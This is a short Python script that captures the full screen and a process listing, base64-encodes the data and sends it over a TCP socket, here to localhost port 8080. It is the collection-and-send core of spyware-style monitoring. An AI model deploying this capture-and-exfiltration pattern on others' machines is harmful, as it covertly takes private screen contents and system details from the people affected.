from io import BytesIO
from PIL import Image,ImageGrab
from base64 import b64encode
import io,subprocess,socket

def screenshot():
    pil = ImageGrab.grab()
    img_bytes = io.BytesIO()
    pil.save(img_bytes, format='PNG')
    img = img_bytes.getvalue()
    return img

def processes():
    cmd = "ps o pid,uid,command"
    processes = subprocess.check_output(cmd, shell=True)
    return processes

def send_to_server(ip, port, data):
    b64 = b64encode(data)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b64)
    s.close()

if __name__ == "__main__":
    send_to_server("127.0.0.1", 8080, screenshot())
    #send_to_server("127.0.0.1", 8080, processes())
